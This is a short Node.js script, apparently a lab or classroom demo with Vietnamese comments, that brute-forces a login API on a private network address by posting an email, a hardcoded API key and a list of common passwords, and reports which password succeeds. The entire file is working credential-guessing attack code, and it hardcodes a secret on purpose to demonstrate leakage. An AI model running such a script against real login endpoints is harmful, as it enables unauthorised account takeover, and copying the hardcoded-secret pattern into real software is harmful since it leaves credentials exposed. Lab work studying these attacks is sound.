const axios = require('axios');
//192.168.100.136 Dai
//192.168.21.104 Nam
const targetUrl = 'http://192.168.100.136:3000/api/auth/login';
const email = 'cd1@gmail.com';
const apikey = 'secretapikey123'; // Hardcode để demo leakage
const passwords = ['password', '1234568', 'admin', 'weakpassword', 'letmein', '123456']; // Danh sách thử

async function bruteForce() {
  for (let password of passwords) {
    try {
      const response = await axios.post(targetUrl, { email, password, apikey });
      if (response.data === "Login successful") {
        console.log(`Success! Password: ${password}`);
        break;
      }
    } catch (error) {
      console.log(`Failed: ${password} - ${error.response.data.error}`);
    }
  }
}

bruteForce();


